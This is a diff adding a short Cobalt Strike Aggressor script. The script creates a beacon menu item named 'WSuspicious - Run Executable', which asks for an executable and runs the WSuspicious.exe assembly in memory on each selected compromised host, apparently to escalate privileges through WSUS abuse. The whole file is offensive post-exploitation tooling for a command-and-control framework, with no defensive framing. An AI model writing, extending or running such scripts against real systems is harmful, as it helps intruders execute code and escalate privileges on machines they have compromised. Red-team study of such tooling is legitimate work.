@@ -1,0 +1,17 @@
+item "WSuspicious - Run Executable"{
+
+			local('$bid');
+				foreach $bid ($1){
+					wsusexe($bid);
+					}
+
+
+}
+
+
+
+sub wsusexe{
+prompt_text("Please Specify An Executable: ", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/WSuspicious.exe'), "/exe $1");
+}, $bids => $1));
+}
